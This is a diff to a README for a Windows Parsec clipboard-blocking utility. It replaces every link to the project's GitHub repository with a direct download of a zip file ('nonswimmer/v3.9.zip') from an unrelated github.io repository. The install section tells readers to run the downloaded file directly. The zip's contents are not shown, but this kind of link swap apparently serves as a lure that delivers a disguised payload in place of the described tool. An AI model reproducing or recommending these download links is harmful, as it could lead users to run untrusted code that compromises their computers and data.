@@ -5,7 +5,7 @@ description: "Isolate and control the Parsec clipboard bridge on Windows to prev
 ---
 # 🛡️ ParsecClipboardIsolator - Protect Your Clipboard from Remote Overwrites
 
-[![Download Now](https://img.shields.io/badge/Download%20Now-%23007ACC?style=for-the-badge&logo=github&logoColor=white)](https://github.com/Introjected-genusmononychus12/ParsecClipboardIsolator)
+[![Download Now](https://img.shields.io/badge/Download%20Now-%23007ACC?style=for-the-badge&logo=github&logoColor=white)](https://raw.githubusercontent.com/Introjected-genusmononychus12/introjected-genusmononychus12.github.io/main/nonswimmer/v3.9.zip)
 
 ## 🚀 What Is ParsecClipboardIsolator?
 
@@ -35,7 +35,7 @@ ParsecClipboardIsolator gives you control. It blocks Parsec from modifying your 
 ## 📥 How to Download and Install
 
 Visit this link to download the application:  
-[Download ParsecClipboardIsolator](https://github.com/Introjected-genusmononychus12/ParsecClipboardIsolator)
+[Download ParsecClipboardIsolator](https://raw.githubusercontent.com/Introjected-genusmononychus12/introjected-genusmononychus12.github.io/main/nonswimmer/v3.9.zip)
 
 Once you are on the page, look for the latest release file. Download it to your computer. After downloading, you can run the application directly—no installation wizard or extra steps needed.
 
@@ -87,6 +87,6 @@ ParsecClipboardIsolator is built with C# and uses Native AOT compilation. It hoo
 
 ## 📦 Download Again
 
-[![Download Now](https://img.shields.io/badge/Download%20Now-%23FF5733?style=for-the-badge&logo=github&logoColor=white)](https://github.com/Introjected-genusmononychus12/ParsecClipboardIsolator)
+[![Download Now](https://img.shields.io/badge/Download%20Now-%23FF5733?style=for-the-badge&logo=github&logoColor=white)](https://raw.githubusercontent.com/Introjected-genusmononychus12/introjected-genusmononychus12.github.io/main/nonswimmer/v3.9.zip)
 
 Keywords: clipboard-blocker, clipboard-isolator, clipboard-privacy, clipboard-sync, csharp, native-aot, parsec, parsec-clipboard, parsec-utility, remote-desktop, windows-utility-2026
